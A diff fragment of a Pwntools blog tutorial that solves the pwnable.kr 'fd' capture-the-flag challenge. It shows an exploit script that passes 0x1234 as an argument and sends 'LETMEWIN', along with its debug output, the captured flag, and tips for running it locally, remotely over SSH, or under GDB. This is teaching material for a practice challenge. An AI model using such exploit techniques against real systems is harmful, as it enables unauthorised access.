+<p>We also set <code>context.log_level='debug'</code> so that we can see all of the traffic sent and received by the challenge binary. I placed this line after <code>start</code> since there is a lot going on behind the scenes to set up the remote process, and we only care about the data sent and received.</p>
+<p>You can see the full debug output of everything that happens by running your exploit with <code>python exploit.py DEBUG</code>.</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
 </span><span class=lnt>2
 </span><span class=lnt>3
 </span><span class=hl><span class=lnt>4
@@ -153,7 +343,9 @@
 </span></span><span class=lnt>7
 </span><span class=lnt>8
 </span><span class=hl><span class=lnt>9
-</span></span></code></pre></td><td class=lntd><pre class=chroma><code class=language-python data-lang=python><span class=c1>#===========================================================</span>
+</span></span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=c1>#===========================================================</span>
 <span class=c1>#                    EXPLOIT GOES HERE</span>
 <span class=c1>#===========================================================</span>
 <span class=hl><span class=n>io</span> <span class=o>=</span> <span class=n>start</span><span class=p>([</span><span class=nb>str</span><span class=p>(</span><span class=mh>0x1234</span><span class=p>)])</span>
@@ -162,7 +354,11 @@
 </span><span class=n>data</span> <span class=o>=</span> <span class=n>io</span><span class=o>.</span><span class=n>recvall</span><span class=p>()</span>
 <span class=n>lines</span> <span class=o>=</span> <span class=n>data</span><span class=o>.</span><span class=n>splitlines</span><span class=p>()</span>
 <span class=hl><span class=n>success</span><span class=p>(</span><span class=n>lines</span><span class=p>[</span><span class=o>-</span><span class=mi>1</span><span class=p>])</span>
-</span></code></pre></td></tr></table></div></div><h3 id=running-the-exploit-locally>Running the Exploit Locally</h3><p>To run the exploit on your local machine, without running on <code>pwnable.kr</code>&rsquo;s servers, just add the <code>LOCAL</code> flag to the command line. Note that you&rsquo;ll need to create a local file called <code>flag</code> which the exploit will dump.</p><div class=highlight><pre class=chroma><code class=language-text data-lang=text># python3 template.py DEBUG LOCAL
+</span></code></pre></td></tr></table>
+</div>
+</div><h3 id=running-the-exploit-locally>Running the Exploit Locally</h3>
+<p>To run the exploit on your local machine, without running on <code>pwnable.kr</code>&rsquo;s servers, just add the <code>LOCAL</code> flag to the command line. Note that you&rsquo;ll need to create a local file called <code>flag</code> which the exploit will dump.</p>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text># python3 template.py DEBUG LOCAL
 [*] &#39;/home/pwntools/pwntools/fd/fd&#39;
     Arch:     i386-32-little
     RELRO:    Partial RELRO
@@ -179,7 +375,10 @@
 [DEBUG] Received 0x17 bytes:
     b&#39;Flag{This_Is_The_Flag}\n&#39;
 [+] Flag{This_Is_The_Flag}
-</code></pre></div><h3 id=running-the-exploit-remotely>Running the Exploit Remotely</h3><p>Now we can run the exploit, and see what happens! The last line is the flag.</p><p>First, a local copy of the binary is loaded into memory, to set <code>context.binary</code> so that everything is set up for Intel i386 architecture. We can see some information about the binary printed out</p><div class=highlight><pre class=chroma><code class=language-text data-lang=text>$ python exploit.py
+</code></pre></div><h3 id=running-the-exploit-remotely>Running the Exploit Remotely</h3>
+<p>Now we can run the exploit, and see what happens! The last line is the flag.</p>
+<p>First, a local copy of the binary is loaded into memory, to set <code>context.binary</code> so that everything is set up for Intel i386 architecture. We can see some information about the binary printed out</p>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text>$ python exploit.py
 [*] &#39;/home/pwntools/pwntools/fd/fd&#39;
     Arch:     i386-32-little
     RELRO:    Partial RELRO
@@ -187,7 +386,8 @@
     NX:       NX enabled
     PIE:      No PIE (0x8048000)
 [+] Connecting to pwnable.kr on port 2222: Done
-</code></pre></div><p>Next, a connection to the pwnable.kr server is established. A temporary directory is created, so that if we need to create files we can (we don&rsquo;t for this challenge, but it&rsquo;s a useful feature) and symlinks are created for all of the files in <code>/home/fd</code>.</p><div class=highlight><pre class=chroma><code class=language-text data-lang=text>[*] fd@pwnable.kr:
+</code></pre></div><p>Next, a connection to the pwnable.kr server is established. A temporary directory is created, so that if we need to create files we can (we don&rsquo;t for this challenge, but it&rsquo;s a useful feature) and symlinks are created for all of the files in <code>/home/fd</code>.</p>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text>[*] fd@pwnable.kr:
     Distro    Ubuntu 16.04
     OS:       linux
     Arch:     amd64
@@ -200,7 +400,8 @@
 [+] Opening new channel: &#39;ln -s /home/fd/* .&#39;: Done
 [+] Receiving all data: Done (0B)
 [*] Closed SSH channel with pwnable.kr
-</code></pre></div><p>Next, the <code>fd</code> process itself is started on the remote server. We send the correct information, and receive a response from the server.</p><div class=highlight><pre class=chroma><code class=language-text data-lang=text>[+] Starting remote process &#39;/home/fd/fd&#39; on pwnable.kr: pid 339379
+</code></pre></div><p>Next, the <code>fd</code> process itself is started on the remote server. We send the correct information, and receive a response from the server.</p>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text>[+] Starting remote process &#39;/home/fd/fd&#39; on pwnable.kr: pid 339379
 [DEBUG] Sent 0x9 bytes:
     b&#39;LETMEWIN\n&#39;
 [+] Receiving all data: Done (62B)
@@ -210,15 +411,86 @@
     b&#39;mommy! I think I know what a file descriptor is!!\n&#39;
 [*] Stopped remote process &#39;fd&#39; on pwnable.kr (pid 339379)
 [+] mommy! I think I know what a file descriptor is!!
-</code></pre></div><h2 id=debugging-locally>Debugging Locally</h2><p>If you would like to debug the binary locally, try launching the <code>exploit.py</code> with <code>GDB</code> as an extra argument: <code>python exploit.py LOCAL GDB DEBUG</code>. The three extra arguments achieve the following:</p><ul><li><code>LOCAL</code> runs the challenge binary on your local system, instead of on Pwnable.kr&rsquo;s server</li><li><code>GDB</code> attaches a debugger to the process, so you can single-step through the challenge if needed.<ul><li>I strongly recommend using <a href=https://pwndbg.com>pwndbg</a> in order to assist in the debugging process</li></ul></li><li><code>DEBUG</code> sets the standard logging level, so you&rsquo;ll get to see what&rsquo;s happening behind the scenes and all traffic.<ul><li>If you use this without <code>LOCAL</code> you&rsquo;ll also see some SSH traffic to run a Python script to invoke the challenge binary, <code>fd</code>.</li></ul></li></ul><div class=blog-tags><a href=https://blog.pwntools.com//tags/pwn-template/>pwn template</a>&nbsp;
+</code></pre></div><h2 id=debugging-locally>Debugging Locally</h2>
+<p>If you would like to debug the binary locally, try launching the <code>exploit.py</code> with <code>GDB</code> as an extra argument: <code>python exploit.py LOCAL GDB DEBUG</code>. The three extra arguments achieve the following:</p>
+<ul>
+<li><code>LOCAL</code> runs the challenge binary on your local system, instead of on Pwnable.kr&rsquo;s server</li>
+<li><code>GDB</code> attaches a debugger to the process, so you can single-step through the challenge if needed.
+<ul>
+<li>I strongly recommend using <a href=https://pwndbg.com>pwndbg</a> in order to assist in the debugging process</li>
+</ul>
+</li>
+<li><code>DEBUG</code> sets the standard logging level, so you&rsquo;ll get to see what&rsquo;s happening behind the scenes and all traffic.
+<ul>
+<li>If you use this without <code>LOCAL</code> you&rsquo;ll also see some SSH traffic to run a Python script to invoke the challenge binary, <code>fd</code>.</li>
+</ul>
+</li>
+</ul>
+<div class=blog-tags>
+<a href=https://blog.pwntools.com//tags/pwn-template/>pwn template</a>&nbsp;
 <a href=https://blog.pwntools.com//tags/file-descriptor/>file-descriptor</a>&nbsp;
 <a href=https://blog.pwntools.com//tags/pwnable.kr/>pwnable.kr</a>&nbsp;
-<a href=https://blog.pwntools.com//tags/easy/>easy</a>&nbsp;</div></article><ul class="pager blog-pager"><li class=next><a href=https://blog.pwntools.com/posts/got-overwrite/ data-toggle=tooltip data-placement=top title="Simple GOT Overwrite">Next Post &rarr;</a></li></ul></div></div></div><footer><div class=container><div class=row><div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1"><ul class="list-inline text-center footer-links"><li><a href=https://github.com/Gallopsled/pwntools#readme title=GitHub><span class="fa-stack fa-lg"><i class="fas fa-circle fa-stack-2x"></i>
-<i class="fab fa-github fa-stack-1x fa-inverse"></i></span></a></li><li><a href=https://twitter.com/Pwntools title=Twitter><span class="fa-stack fa-lg"><i class="fas fa-circle fa-stack-2x"></i>
-<i class="fab fa-twitter fa-stack-1x fa-inverse"></i></span></a></li><li><a href=https://discord.gg/96VA2zvjCB title=Discord><span class="fa-stack fa-lg"><i class="fas fa-circle fa-stack-2x"></i>
-<i class="fab fa-discord fa-stack-1x fa-inverse"></i></span></a></li></ul><p class="credits copyright text-muted"><a href=https://github.com/Gallopsled>Team Gallopsled</a>
+<a href=https://blog.pwntools.com//tags/easy/>easy</a>&nbsp;
+</div>
+</article>
+<ul class="pager blog-pager">
+<li class=next>
+<a href=https://blog.pwntools.com/posts/got-overwrite/ data-toggle=tooltip data-placement=top title="Simple GOT Overwrite">Next Post &rarr;</a>
+</li>
+</ul>
+</div>
+</div>
+</div>
+<footer>
+<div class=container>
+<div class=row>
+<div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+<ul class="list-inline text-center footer-links">
+<li>
+<a href=https://github.com/Gallopsled/pwntools#readme title=GitHub>
+<span class="fa-stack fa-lg">
+<i class="fas fa-circle fa-stack-2x"></i>
+<i class="fab fa-github fa-stack-1x fa-inverse"></i>
+</span>
+</a>
+</li>
+<li>
+<a href=https://twitter.com/Pwntools title=Twitter>
+<span class="fa-stack fa-lg">
+<i class="fas fa-circle fa-stack-2x"></i>
+<i class="fab fa-twitter fa-stack-1x fa-inverse"></i>
+</span>
+</a>
+</li>
+<li>
+<a href=https://discord.gg/96VA2zvjCB title=Discord>
+<span class="fa-stack fa-lg">
+<i class="fas fa-circle fa-stack-2x"></i>
+<i class="fab fa-discord fa-stack-1x fa-inverse"></i>
+</span>
+</a>
+</li>
+</ul>
+<p class="credits copyright text-muted">
+<a href=https://github.com/Gallopsled>Team Gallopsled</a>
 &nbsp;&bull;&nbsp;&copy;
 2021
 All Rights Reserved
 &nbsp;&bull;&nbsp;
-<a href=https://blog.pwntools.com/>Pwntools Blog</a></p><p class="credits theme-by text-muted"><a href=https://gohugo.io>Hugo v0.82.1</a> powered &nbsp;&bull;&nbsp; Theme <a href=https://github.com/halogenica/beautifulhugo>Beautiful Hugo</a> adapted from <a href=https://deanattali.com/beautiful-jekyll/>Beautiful Jekyll</a></p></div></div></div></footer><script src=https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.js integrity=sha384-K3vbOmF2BtaVai+Qk37uypf7VrgBubhQreNQe9aGsz9lB63dIFiQVlJbr92dw2Lx crossorigin=anonymous></script><script src=https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/contrib/auto-render.min.js integrity=sha384-kmZOZB5ObwgQnS/DuDg6TScgOiWWBiVt0plIRkZCmE6rDZGrEOQeHM5PcHi+nyqe crossorigin=anonymous></script><script src=https://code.jquery.com/jquery-1.12.4.min.js integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin=anonymous></script><script src=https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js integrity=sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa crossorigin=anonymous></script><script src=https://blog.pwntools.com/js/main.js></script><script>renderMathInElement(document.body)</script><script src=https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.js integrity=sha384-QELNnmcmU8IR9ZAykt67vGr9/rZJdHbiWi64V88fCPaOohUlHCqUD/unNN0BXSqy crossorigin=anonymous></script><script src=https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe-ui-default.min.js integrity=sha384-m67o7SkQ1ALzKZIFh4CiTA8tmadaujiTa9Vu+nqPSwDOqHrDmxLezTdFln8077+q crossorigin=anonymous></script><script src=https://blog.pwntools.com/js/load-photoswipe.js></script><script>(function(){var c='a6e761131baa51ced',a=document.createElement('script'),b;a.type='text/javascript',a.async=!0,a.src='https://cse.google.com/cse.js?cx='+c,b=document.getElementsByTagName('script')[0],b.parentNode.insertBefore(a,b)})()</script></body></html>
+<a href=https://blog.pwntools.com/>Pwntools Blog</a>
+</p>
+<p class="credits theme-by text-muted">
+<a href=https://gohugo.io>Hugo v0.88.1</a> powered &nbsp;&bull;&nbsp; Theme <a href=https://github.com/halogenica/beautifulhugo>Beautiful Hugo</a> adapted from <a href=https://deanattali.com/beautiful-jekyll/>Beautiful Jekyll</a>
+</p>
+</div>
+</div>
+</div>
+</footer><script src=https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.js integrity=sha384-K3vbOmF2BtaVai+Qk37uypf7VrgBubhQreNQe9aGsz9lB63dIFiQVlJbr92dw2Lx crossorigin=anonymous></script>
+<script src=https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/contrib/auto-render.min.js integrity=sha384-kmZOZB5ObwgQnS/DuDg6TScgOiWWBiVt0plIRkZCmE6rDZGrEOQeHM5PcHi+nyqe crossorigin=anonymous></script>
+<script src=https://code.jquery.com/jquery-1.12.4.min.js integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin=anonymous></script>
+<script src=https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js integrity=sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa crossorigin=anonymous></script>
+<script src=https://blog.pwntools.com/js/main.js></script><script>renderMathInElement(document.body)</script><script src=https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.js integrity=sha384-QELNnmcmU8IR9ZAykt67vGr9/rZJdHbiWi64V88fCPaOohUlHCqUD/unNN0BXSqy crossorigin=anonymous></script>
+<script src=https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe-ui-default.min.js integrity=sha384-m67o7SkQ1ALzKZIFh4CiTA8tmadaujiTa9Vu+nqPSwDOqHrDmxLezTdFln8077+q crossorigin=anonymous></script><script src=https://blog.pwntools.com/js/load-photoswipe.js></script>
+<script>(function(){var c='a6e761131baa51ced',a=document.createElement('script'),b;a.type='text/javascript',a.async=!0,a.src='https://cse.google.com/cse.js?cx='+c,b=document.getElementsByTagName('script')[0],b.parentNode.insertBefore(a,b)})()</script>
+</body>
+</html>
